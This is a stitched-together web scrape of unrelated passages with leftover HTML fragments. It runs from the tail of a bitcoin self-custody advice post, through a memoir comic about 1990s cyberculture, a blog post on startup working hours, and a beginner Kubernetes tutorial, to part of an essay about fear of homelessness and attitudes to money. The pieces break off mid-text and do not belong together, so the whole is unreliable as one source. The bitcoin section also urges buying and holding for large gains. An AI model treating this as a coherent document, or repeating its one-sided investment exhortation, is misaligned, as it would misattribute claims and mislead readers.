<p>It’s a wild roller-coaster. Bitcoin can 10x in the space of a few months, and you can be left <em>very</em> exposed if you’re not careful. A $10k bitcoin stack can quickly become $100k, a $100k stack can quickly become $1M and so on. </p>



<p>Consider the worth of your stack currently, and think about if Bitcoin were to 10x or 20x over a few months or a year. Would you be comfortable with the level of security you have? </p>



<p>If you aren’t bullish enough, and you’re only looking for a 2x and then flip for fiat profits, you aren’t thinking big enough. You should be looking to learn about bitcoin security by listening to SLP such as <a href="http://stephanlivera.com/97">SLP97</a> and <a href="http://stephanlivera.com/215">SLP215</a> with Michael Flaxman. You should be looking at ways to: </p>



<ul><li>Ensure appropriate entropy in your bitcoin seed generation </li><li>Minimise single points of failure</li><li>Consider multi signature</li><li>In the ideal case, use open source hardware and software that has been vetted from a security perspective</li><li>Learn about how to verify signatures for software you use</li><li>Learn hardware wallet best practices</li></ul>



<h2>Not learning enough about how to use Bitcoin the right way</h2>



<p>When we talk about using Bitcoin, we mean using it in a self sovereign way. You shouldn’t be in a situation where you are exclusively trusting or relying on your service provider to give you your bitcoins. </p>



<p>This is not stocks or dollars in your bank account. This is Bitcoin. Use it the self sovereign way. </p>



<p>In practice this means: </p>



<ul><li>Don’t leave your coins in custodial accounts. Use sovereign bitcoin wallets where you hold the private keys. Or at least, a quorum of private keys (e.g. you hold 2 of 3 keys, or 4 of 5 keys). </li><li>Ideally, perform your own validation by running your own underlying bitcoin node. This is easy with <a href="https://www.ministryofnodes.com.au/2020/09/28/cost-effective-bitcoin-use-hardware-wallet-own-node/">Specter Desktop + Bitcoin Core</a>, or with <a href="https://www.ministryofnodes.com.au/2020/03/26/mynode-video-tutorials/">myNode</a>, or other projects e.g. Umbrel, <a href="http://raspiblitz.com/">RaspiBlitz</a>, <a href="http://ronindojo.io/">Ronin Dojo</a>, <a href="http://btcpayserver.org/">BTCPay Server</a>, <a href="http://nodl.it/">nodl</a> etc. </li></ul>



<h2>Not realising the societal implications of Bitcoin</h2>



<p>Fiat money has cultural consequences that many simply do not understand right now. It’s like we’re fish swimming in the water without realising what we’re swimming in. We’ve grown up in an environment of cheap debt, facing incentives to go into debt or lose. </p>



<p>This drives all kinds of changes in our society that weren’t so obvious pre-1971. Increased welfare statism, increased debt, higher time preference, increased centralisation into managerial superstates, to name a few. </p>



<p>As Bitcoin becomes more widely adopted, society’s return to hard money will drive significant cultural shifts that align with the return to hard money. Listen to <a href="http://stephanlivera.com/51">SLP51 with Guido Hulsmann</a> to know more.</p>



<h2>Conclusion</h2>



<p>Fundamentally, it takes knowledge, conviction, and dedication to do this. There are many pitfalls along the way, and it takes work from the HODLer to methodically and skilfully avoid these pitfalls. Of course, we can lament the difficulty and push it off til the future when it’ll be easier. But that is also giving up the huge return potential, and also the freedom and moral imperative of bringing about a Bitcoin Standard. </p>



<p>Do your research and learning, be methodical in your approach, and you’ll be in with a good shot. </p>

			This much I knew:
			<br>
				In the future, all cities would look like the one that appeared behind Kaptain Kool &amp; the Kongs on Saturday morning's <i>Krofft Supershow</i>. Bloated, curvaceous structures — engineered by the same people who designed Corvette Stingrays and Yes album covers — built out of shiny fiberglass, pristine chrome, and pulsating neon light -- Tomorrow's city would be a Space Age coral reef, teeming with millions of funky life forms, its limitless nooks and enclaves seething with parties, discos, arcades, and mind-blowing good times....

			My van would be more than just a mode of transportation... It would be my spaceship for navigating the Strip.
			<br>
				The Strip would eventually encompass the world. Domed cities would interconnect across continents , and hamster-tube highways would extend down into the ocean so that you could cruise the aquatic sea-cities. 
			<br>
				Your van could literally take you anywhere on Planet Earth. Maybe not as fast as a Concorde jet, but speed wasn't important. Getting there was all the fun.

			What I would be doing for a living? I didn't care. According OMNI magazine, the technological changes of the 
			Eighties were going to be so <i>vast</i>, so <i>profound</i>, that the job market would be unrecognizable by the time I entered the workforce.
			</p><p>
			
				Nearly any job I trained for now would be obsolete by 1990. Computers and solar-powered robot factories would be doing most of the work. Consumer goods would be mostly free, and the U.N. would be paying us all not to work.

			The important things in human life — sex, technology, hedonism, and the peaceful exploration of inner and outer space — these would occupy most of our time as a new Golden Age dawned for humanity. No matter where you went, you would find millions of groovy freaks boogying down, partying hearty, and tossing off symphonies, rocketship designs, and cures for cancer as freely as a tree drops fruit. Human civilization would have truly begun....

I do, however, have a job. It just doesn't <b>pay</b> enough.

I'm not going anywhere in particular. I just have to lose myself in the suburbs for a few hours. I'll creep back later in the day. Hopefully my housemates will be gone and I can sneak back into my room.

			My current housemates, fortunately, didn't check my credit or ask for anything upfront... they naively assumed that since I was in college, I must be a solvent young bourgeois like themselves.
</p><p>
I did nothing to disabuse them of this illusion.

		The locale I'm trapped in is<b> Santa Luna,</b> California, a sleepy seaside college town 

 situated 50 miles west of Silicon Valley. If exciting things are happening in Silicon Valley, 
you surely won't hear about them here. 

Santa Luna is its own self-contained bubble reality, a sort of hippy-dippy alternate universe that might have branched off from ours
if McGovern had won the 1972 presidential election. 
</p><p>
Tourists call this town "charming." For me, being stuck here after I've  graduated
feels a lot like bathing in my own urine.

For those of you who either weren't alive, or weren't paying attention at the time:
</p><p>
Back in 1983 an old acidhead named William Gibson sat down at his
Hermes 3000 manual typewriter and banged out what was to become
the most popular science fiction novel of that decade...
</p><p>
Concerning people plugging their brains directly into their
computers, Gibson's novel was originally titled <i>Jacked In.</i></p><p>
The publishers feared this sounded too much like "jacked off",
and changed the title to a more marketable <i>Neuromancer</i>.

	</p></div>

</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_neuromancer.gif"></p><div><p>


This little book of his was to cause quite a stir...</p><p>

<i>Neuromancer</i> had a tremendous cultural impact, not the least of which was the introduction of a new word into the English language 
— <i><b>cyberspace</b></i>.
</p><p>
In subsequent years, the prefix "cyber-" sort of broke off and did its own <i>thing...</i></p></div>
</div>
<!--The background color for the page.-->

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_cyberexpo93.gif"></p><div><p>
Which brings us to the year 1993 and the first annual <b>“Cyber Expo.”</b></p><p>

For the past few years I had been reading about a newly emerging <b> “cyberculture” </b>
in exciting new magazines with names like <i>Phringe Surfer, FutureShock, Cyborgasm, Digital Frontier</i>, and <i>Fast Forward.</i></p><p>
In May of 1993 I scraped together my month's grocery money and made the Greyhound bus trip to San Francisco. 
I was <i>finally</i> going to meet the movers and shakers of this cyberculture face to face!
Smart drug entrepreneurs, multimedia artists, hackers, inventors of mindblowing new technologies,
<i>all</i> would be congregating here in this one space.

It was already 1993, and the future  I'd imagined in 1978 was running a little behind schedule.</p><p>

Was it possible that here and now, the future was off to a proper start?</p><p>

Would I  finally  find the community I'd always hoped for? </p><p> Would I, at last,  discover  “my” people?

The presentation was called “Cyber Revolution: Power to the People” and it was attended by some of the hippest of the California "Digerati".
</p><p>
I took the opportunity to buttonhole an editor I'd been petitioning for several months. His name was Sparky West and he was editor-in-chief of 
<i>Fast Forward</i>, one of the seminal cyberculture magazines.
</p><p>
Their motto: <i>"Made for the Smartest People on Earth."</i></p><p>
(Yes,<i> I know.</i> That should have been my first warning.)

</section>
<p>When I joined my first startup almost ten years ago, most of the prevailing wisdom about startups said that you should be ready for an 80-hour per week grind. So, I made it my mission to work longer and harder than anyone else on the path to success.</p>
<p>At that time, I didn’t have a family, significant other, or many hobbies outside of work, plus I liked my job, so it was relatively easy to put in long hours and work weekends. While I did a lot of tasks in those early days, looking back, I realize that <em>I didn’t actually accomplish much.</em></p>
<p>After working for three early-stage startups and <a href="https://www.karllhughes.com/posts/cto-writer">founding my own in 2020</a>, I’ve talked to countless founders about startup hours, pacing, burnout, and hustling. I’ve since seen a lot of founders fall into the trap of working more hours instead of working smarter, so in this post, I’ll give you my perspective on why this happens. Finally, I’ll share a few things that I’ve learned about maintaining balance in a startup from both an employee’s and founder’s perspective.</p>
<h2 id="typical-startup-hours">“Typical” Startup Hours</h2>
<p>One of the challenging things about joining a startup is that there are rarely “typical” work hours. Some startups expect employees to be in the office from 8 am to 8 pm every day and answer emails on the weekend, while others might allow complete flexibility with very little concern over hours worked.</p>
<p><strong>While it’s <a href="https://www.karllhughes.com/posts/myths-working-engineer-startup">a myth that every startup requires you to work overtime every week</a>, most startup employees put in 50-60 hours per week, and many founders put in 60-100 per week.</strong></p>
<p>The problem with long hours is that they’re counterproductive:</p>
<blockquote>
<p>“John Pencavel found that productivity per hour declines sharply when a person works more than 50 hours a week. After 55 hours, productivity drops so much that putting in any more hours would be pointless. And, those who work up to 70 hours a week are only getting the same amount of work done as those who put in the 55 hours.” - <a href="https://www.cnbc.com/2019/03/20/stanford-study-longer-hours-doesnt-make-you-more-productive-heres-how-to-get-more-done-by-doing-less.html">CNBC Report on Standford Productivity Study</a></p>
</blockquote>
<p><a href="https://amzn.to/2WjbkL5"><img src="https://i.imgur.com/Vn2qohv.jpg" alt="Bored and Brilliant book cover"></a></p>
<p>Your body ultimately needs sleep, food, relaxation, and <a href="https://www.gq.com/story/how-and-why-you-should-be-bored"><em>even boredom</em></a> to function properly. This is especially true for those of us who do <a href="https://www.wired.com/story/eight-hour-workday-is-a-lie/">high-concentration, creative work</a> (like writing, programming, and strategic thinking).</p>
<p>One of my favorite reads in 2019 was <em><a href="https://amzn.to/2WjbkL5">Bored and Brilliant</a></em> because it reminded me of the need to put down my phone and just think every once in a while. Regular introspection leads to clarity, focus, and prioritization that is extremely valuable as a startup founder.</p>
<p><em>Looking for more good startup books? I’ve listed <a href="https://www.karllhughes.com/posts/startup-books">a few dozen of my favorites here</a>.</em></p>
<h2 id="why-are-startup-hours-so-long">Why Are Startup Hours so Long?</h2>
<p>So if the research is against long hours for most people, why do startup founders work so much? And, why do they, in turn, expect their employees to do the same?</p>
<p>There are four factors I see at play in defining startup working hours:</p>
<h3 id="1-hustle-culture">1. Hustle Culture</h3>
<blockquote>
<p>“I don’t think it’s fair for people to say that they work 100 hours. That’s just a PR move, like when Elon Musk sleeps on a hard couch in a meeting room. Why couldn’t he have a nice bed delivered to his office?” - <a href="https://www.quora.com/How-many-hours-per-day-do-startup-employees-work-compared-to-those-at-a-regular-company/answer/Nope-Nope-351">Anonymous opinion on Quora</a></p>
</blockquote>
<p>You might think of startup founders as original, free-thinking, creative people, but most of them are just as vulnerable to peer pressure and cultural norms as any of us. So, when high-profile startup founders report that they <a href="https://www.businessinsider.com/elon-musk-sleeps-under-desk-as-tesla-faces-model-3-production-goals-2018-6">slept at the office</a>, other founders see this as a template for success. Some even <a href="https://hbr.org/2015/04/why-some-men-pretend-to-work-80-hour-weeks">lie about the number of hours they work</a> because of the cultural pressure to put in more time.</p>
<h3 id="2-work-life-separation-is-dwindling">2. Work-Life Separation is Dwindling</h3>
<p>It’s even harder to “unplug” from work when your office is six feet away from your bedroom, and your phone goes to bed with you at night. Now that more companies are going remote, employees <a href="https://www.cbsnews.com/news/covid-19-lockdown-work-from-home-day-one-hour-longer/">are working longer hours</a> and having more meetings in what would be off-hours.</p>
<p>The problem is even more pronounced for startup founders. They are often betting their financial future on their new business or so wildly passionate about the problem they solve that it’s next to impossible to “turn it off.”</p>
<h3 id="3-external-pressure">3. External Pressure</h3>
<p>Building a business requires making promises to a lot of people. As a founder, you’re telling employees that they’ll have a job, you’re telling customers that you’ll deliver value, and you’re promising your family that all this sacrifice will be worth it someday. These pressures are amplified when startups raise money because venture-funded startups have a board who might watch the founders closely to make sure they’re working as hard as possible to get them the return they expect.</p>
<p>Once these external pressures are internalized, companies tend to build a culture that encourages long hours. Managers then reward employees who put in the most time, and employees come to expect these working conditions. You can see this vicious cycle most prominently in <a href="https://abovethelaw.com/2019/12/the-biglaw-firm-where-associates-are-putting-in-the-most-working-hours/">law and consulting</a> where billable hours are a badge of honor.</p>
<h3 id="4-gatekeeping">4. Gatekeeping</h3>
<p>This might be controversial, but I believe that part of the reason startups tout their commitments to long hours is as a form of gatekeeping.</p>
<p>When you require everyone in your company to work 60+ hour weeks, you exclude people who have a family at home, kids they need to pick up from school, or mental health issues. This disproportionately hurts minorities, single parents, older workers, and <a href="https://www.telegraph.co.uk/news/2016/06/16/working-long-hours-harms-women-but-protects-men-study-shows/">women</a>, and it’s part of the reason we see fewer underrepresented groups in startups.</p>
<p>This isn’t always the case though. I remember meeting a CTO at another startup early in my career who quit work at 3 pm every day to pick up his kids. This <a href="https://www.karllhughes.com/posts/startup-culture">set a culture at the company</a>, which was totally different from my experience.</p>
<p><img src="https://i.imgur.com/ApmhcQ1.png" alt="Long hours is a form of gatekeeping"></p>
<h2 id="you-need-appropriate-pacing">You Need Appropriate Pacing</h2>
<p>All this pressure will eventually lead to burnout somewhere within your startup. Whether the founder cracks under pressure or you can’t retain employees because of the rigorous pace, it often hurts the organization in the long run.</p>
<p>Short sprints of long hours are possible - and in my experience, often necessary in a startup - but growing a successful company takes years, not months. No number of hours worked can shortcut this fact.</p>
<blockquote>
<p>“If you really look closely, most overnight successes took a long time.” – Steve Jobs</p>
</blockquote>
<p>The problem is that many founders get pressured into thinking short-term. Whether it’s investors pushing them to show traction required for future funding rounds or unfulfilled promises to customers, founders often overcommit themselves to a point where a sustainable pace is impossible.</p>
<h2 id="tips-for-startup-founders">Tips for Startup Founders</h2>
<p>At different stages of a company’s life, different levels of commitment are required. But, no matter what you’re working on, it’s not productive to keep grinding away month after month without giving yourself a break.</p>
<p>Similarly, if you have employees, <strong>you can’t expect them to selflessly spend their lives working long hours and holidays just to help you fulfill your dream.</strong> You <em>can</em> push people to a certain point, but learning how to do so in a productive and worthwhile way is one of the best things you can learn if you want to retain your best employees.</p>
<p>Here are four things I’ve learned about startup work hours and pacing as a founder:</p>
<h3 id="1-dont-push-people-without-a-purpose">1. Don’t Push People Without a Purpose</h3>
<p>It’s tempting as an entrepreneur to always want more from your employees, but just because you feel a sense of urgency in managing your business doesn’t mean every one of your employees will feel the same. <strong>One of the most frustrating things for employees is being pushed to work harder, longer hours without a clear purpose that ties directly into their performance.</strong></p>
<p>Similarly, if you do expect employees to work 60+ hours per week, be upfront with them about this expectation. There are plenty of young go-getters (I was one of them) who don’t mind putting in long hours but be aware that you might be missing some highly-qualified, experienced candidates with this approach.</p>
<h3 id="2-more-work-is-not-a-solution-to-poor-planning">2. More Work is Not a Solution to Poor Planning</h3>
<p>If one department in your company is behind on a deadline, figure out how you can work with them to either adjust expectations, change their requirements, or estimate better next time. Just because you or someone in your organization planned poorly does not mean it’s a good idea to push everyone else to the breaking point.</p>
<h3 id="3-listen-to-your-employees">3. Listen to Your Employees</h3>
<p>Even more important than avoiding situations that stress your employees is listening to them when they are feeling the pressure. If you’re cultivating the right atmosphere at the office, don’t be surprised when someone shows up to tell you that they can’t keep up the pace for another 60 hour week.</p>
<h3 id="4-trust-your-people">4. Trust Your People</h3>
<p>Finally, as an entrepreneur, you have to be able to trust your employees. If you don’t, you need to ask yourself why you hired them or find a way to replace them. When you trust your employees, you’ll know that when they insist they’re working too much, they really are.</p>
<p><em>Note: I’ve added a few books on this topic in <a href="https://www.karllhughes.com/posts/startup-books">my list of the best startup books for founders here</a>.</em></p>
<h2 id="questions-for-potential-startup-employees">Questions for Potential Startup Employees</h2>
<p>While the bulk of an early-stage startup’s culture is defined by the founders, employees and managers have a lot of influence on working hours and pacing too. If you’re being hired by a startup and you’re not sure about what the culture is like, here are some questions you can ask to get a better sense:</p>
<h3 id="1-how-many-hours-per-week-is-typical">1. How Many Hours Per Week is Typical?</h3>
<p>You can ask this question without sounding lazy. I always tell employees this expectation, but if you’re in an interview with a startup and they don’t say it explicitly, it’s better to know what they expect than to be surprised on your first day.</p>
<h3 id="2-do-you-have-typical-working-hours">2. Do You Have Typical Working Hours?</h3>
<p>Again, with more companies going remote, many are also giving employees the option to work their own hours. I have customers in Europe, Australia, Asia, and the US, so even though I try not to work more than 40 hours per week, I don’t have a very “typical” schedule.</p>
<h3 id="3-do-people-hang-out-outside-of-work-much">3. Do People Hang Out Outside of Work Much?</h3>
<p>I asked this question in interviews with startups because I wanted to know the dynamic of …</p></div></article></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The why and how of Kubernetes, instead of the what. A gentle introduction to Kubernetes.</p><div>
        <p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Kubernetes_logo_without_workmark.svg/1234px-Kubernetes_logo_without_workmark.svg.png"></p>
<p>When asked what <a href="https://k8s.io/">Kubernetes</a> is, most people will answer with "a container orchestration system".</p>
<p>This is a good factual statement of the <em>what</em>, but it misses the <em>why</em> and <em>how</em>, which are much more important for developing a good understanding of Kubernetes.</p>
<p>In this article, we'll explore <em>why</em> and <em>how</em> Kubernetes is (instead of the what), and why <strong>containers are just an implementation detail</strong> and <strong>not the main point of Kubernetes</strong>.</p>
<p>If "Kubernetes = Docker but highly complex" is you, read on. I'll try to correct some misunderstandings in this post. Otherwise, you may be interested in my next post on declaratively running Kubernetes without building up bad state (link at the end of this article).</p>
<h2 id="so-what-why-is-kubernetes">So <del>what</del> why is Kubernetes?</h2>
<p>Think of Kubernetes like an operating system (OS).</p>
<p>In a traditional OS you have resources like CPU, memory, and storage. The job of the OS is to schedule which software gets what resources at any given time.</p>
<p>Kubernetes does the same thing. You have resources on each one of your nodes, and Kubernetes assigns those resources to the software running on your cluster.</p>
<p>For our purposes, there are <strong>two key differences</strong> between Kubernetes and a traditional OS.</p>
<p>The first difference is the way you define what software to run. In a traditional OS, you have an init system (like systemd) that starts your software. In Kubernetes, you define objects, and Kubernetes uses these objects to configure and run the software you specify. Objects are similar to those in programming languages: they are typed and contain data specific to their type.</p>
<p>The second difference is that Kubernetes works across multiple computers. In a traditional OS, you need to decide what software gets deployed to what machine. With Kubernetes, you deploy one piece of software to the entire cluster, and Kubernetes figures out what machine to run it on based on the rules you give it. For example, you might say you want to run IPython notebooks on any node with a GPU, and run your web apps on nodes without GPUs.</p>
<p>Notice how my definition of Kubernetes doesn't include the word "container". This is on purpose. <strong>The main idea behind Kubernetes is declarative infrastructure management, not running containers.</strong> Someone could also have implemented the ideas behind Kubernetes but with VMs or processes as the smallest compute units.</p>
<p>Credit: I heard this analogy first from <a href="https://fyd.ai/">~fydai</a>.</p>
<h2 id="what-kinds-of-objects-are-there">What kinds of Objects are there?</h2>
<p>As mentioned in the previous section, the main idea behind Kubernetes is its object system. All objects have some basic fields (like their <code>name</code>, <code>uid</code>, and user-customizable <code>label</code>s), and many common objects additionally have a <code>namespace</code> that helps keep logical groups of objects separate.</p>
<p>Here are some common object types, and what you might use them for. Obviously, some of these are oversimplified (a <code>Deployment</code> actually makes a <code>ReplicaSet</code> not a <code>Pod</code>), but we're ignoring details for now.</p>
<p><code>Pod</code> - A small group of containers (but is usually just one container). Note: Containers follow the OCI standard, meaning any image built by any OCI-compatible software (like Docker, Podman, etc.) will work on any other OCI-compatible runner.</p>
<p><code>Deployment</code> - A group of pods, with some basic fields for things like the number of replicas to deploy.</p>
<p><code>Service</code> - A group of ports that point to pods, depending on some user-specified rules.</p>
<p><code>Ingress</code> - Expose your service with some rules, such as the hostname to respond on. This requires an Ingress provider like nginx to be installed on your cluster (more on this in a later post).</p>
<p><code>PersistentVolumeClaim</code> - A reference to a persistent filesystem that you can store your data in. This requires a pvc provider to be installed on your cluster- which range from local filesystem storage on one node to distributed storage with Ceph (more on this in a later post).</p>
<p><code>CustomResourceDefinition</code> - It is also possible to make your own types, and write your own logic to determine what they do. This can allow you to create higher level objects like <code>PostgresInstance</code> or <code>MonitoringEndpoint</code>. This is known as the "Operator Pattern" and is beyond the scope of this article.</p>
<p><strong>These objects are your Kubernetes building blocks.</strong> To deploy software, you just need to combine them in various ways to serve your needs.</p>
<p>Let's look at an example.</p>
<h2 id="example-a-typical-web-app">Example: A Typical Web App</h2>
<p>To make this less scary, let's do this without looking at the actual objects. Objects are typically written in YAML, but this was a bad design choice by the designers of Kubernetes. Most typical uses will require generating YAML in some way, which I'll talk more about in the next article. If you want to read the YAML I used for this, check out <a href="https://gist.github.com/nikhiljha/8509ac568bdcf3d28541fca281f3c15b">this gist</a>.</p>
<p>Say we have an OCI image that contains a web app that listens on port 8080. To represent this in Kubernetes, we will use a Pod.</p>
<center><img src="https://nikhiljha.com/images/2020/kubernetes-intro/pod.svg"></center>
<p>The Pod definition will contain some variables that we set, such as the image reference (<code>k8s.gcr.io/echoserver:1.4</code>), the pod name (<code>echo</code>), some resource requests (<code>100MB</code> RAM and half a CPU core), a label (<code>app=echo</code>), and the port that it listens on (<code>8080</code>).</p>
<p>When we add this object to the cluster, Kubernetes will run the container on an available node that has enough compute resources. However, a Pod is an ephemeral unit. If it crashes or stops, it won't restart. To fix this, we'll wrap our Pod object in a <code>Deployment</code> object.</p>
<center><img src="https://nikhiljha.com/images/2020/kubernetes-intro/deployment.svg"></center>
<p>The Deployment definition will have a name (<code>echo</code>), a label (<code>app=echo</code>), and a copy of the Pod object definition we wrote earlier.</p>
<p>Remember, a Deployment object creates Pod objects according to some specification. For now, we'll create just one.</p>
<p>We'll then add the <code>Deployment</code> object to the cluster by running <code>kubectl apply -f my_definition_file.yaml</code>, and pretty soon we can see both the <code>Deployment</code> and the <code>Pod</code> it made in <code>kubectl get deployment</code> or <code>kubectl get pod</code>.</p>
<p>Next we need a way to access the deployment. To do this, we'll use a <code>Service</code> and an <code>Ingress</code>.</p>
<center><img src="https://nikhiljha.com/images/2020/kubernetes-intro/svc-ingress.svg"></center>
<p>The <code>Service</code> will point to port <code>8080</code> on all <code>Pod</code>s that are labeled <code>app=echo</code>, and the <code>Ingress</code> will route all traffic on <code>echo.example.com</code> to the <code>Service</code> with the name <code>echo</code>.</p>
<p>If we visit <code>echo.example.com</code>, we'll see our echo service! Hooray!</p>
<p><img src="https://nikhiljha.com/images/2020/kubernetes-intro/browser-sc.svg" alt=""></p>
<p>But wait, there's more. Remember when I said that using a <code>Deployment</code> to manage our <code>Pod</code> would give us an extra-cool feature?</p>
<p>Let's see what happens when we set <code>replicas</code> to <code>2</code> in our <code>Deployment</code>.</p>
<center><img src="https://nikhiljha.com/images/2020/kubernetes-intro/deployment(2).svg"></center></div><p>Now, even if one <code>Pod</code> crashes, the other one is still around to serve requests, while the other one restarts! We've successfully deployed Highly Available HTTP Echo™!</p><p>Hopefully this gave you a good idea of how to use the various Kubernetes building blocks to define infrastructure.</p><p>In my next post, I'll talk about how you can declaratively setup and manage your Kubernetes cluster <em>without</em> building up bad state or having to manage too much YAML.</p><p>Here are the Kubernetes-related articles I'm working on...</p></div>]]>

For most of us, that’s not a big deal. We have our whole lives ahead of us to work, so taking a few months off to “find yourself” can be completely justifiable.</p><p>Well, let’s just say that wasn’t the case for me.</p><p>I spent sleepless nights scouring job postings for any company that might be interested in what little I had to offer. I smacked that “Upload Resume” button around like it was my arch nemesis, but made sure to carefully upload the proper file format before doing so.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume.png" alt="upload PDF for resume" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A01-Uploading-Resume-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>My days consisted of nothing but napping, eating, uploading, and submitting. To put it mildly, I was in a state of panic to find some sort of work.</p><p>Some might have viewed this obsessive job search as an impressive character trait. It may have masqueraded as a signal of ambition, an indicator that I was a guy that had his priorities straight.</p><p>The truth, however, was far from that. I wasn’t driven by some magnificent search for purpose, or the nagging desire to provide value to society. I was driven by something far less chivalrous:</p><p>My intense, terrifying fear of being homeless.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness.png" alt="fear of homelessness" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A02-Thinking-of-Homelessness-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>For the longest time, this fear is what drove my panicked desire to find stable, well-paying work (regardless of how <a href="https://moretothat.com/pointless-job/" target="_blank" rel="noopener noreferrer">pointless it was</a>). I thought that as long as I could save some money with each paycheck, I wouldn’t have to sleep in the streets if something went awry.</p><p>Some of you may understand this fear, while others may view it as deeply irrational. I know people from wealthy backgrounds who have this fear, and people raised on welfare that don’t. My family didn’t have much money growing up, but that doesn’t quite justify the existence of this strain of fright.</p><p>Regardless of its origin, this fear was very much alive in me throughout my twenties, and it framed my perspective of money. Instead of viewing money as a generator of wealth, I saw it as an immediate safety net that (barely) kept me away from living on freeway on-ramps. The more of it I had, the more relief and distance it gave me from the streets.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net.png" alt="falling into money safety net" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A03-Safety-Net-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Well, many years have passed since then, and fortunately, I no longer have this fear.<span title="It took some time and life experience to reshape this perspective, but chief among them was the realization that being homeless was more about the poverty of love than the absence of money. As the bonds with my loved ones strengthened and took shape, this truth grew apparent and faded that fear out of my mind.">1</span> However, that doesn’t mean that I no longer think about money. It’s the <a href="https://moretothat.com/how-money-forever-changed-us/" target="_blank" rel="noopener noreferrer">greatest story humanity has ever subscribed to</a>, so it will always be a central character in the theater of everyday life. What has changed isn’t money itself, but the way in which it colors the way I view the world.</p><p>Life is almost always a framing problem, and wealth is no exception to this. To say that money is complicated is a cliche worthy of a thousand eye rolls, but when it comes to our ongoing relationship with it, I find that it’s quite simple to explain and distill. At any given moment, our journey falls along a vertical spectrum with three main phases:</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller.png" alt="more to that - the money spectrum" width="1500" height="1820" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller-247x300.png 247w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller-844x1024.png 844w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller-768x932.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller-1266x1536.png 1266w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B01-The-Money-Spectrum-smaller-610x740.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>This is what I call <span>The Money Spectrum</span>, and it represents the wide variety of views we have about the almighty dollar/euro/whatever throughout our lives. Money can be a difficult thing to talk about because it invokes a blend of weird emotions, and this amorphous slushie of feelings can be hard to express through the crude tool of language.</p><p>The purpose of the Money Spectrum is to take 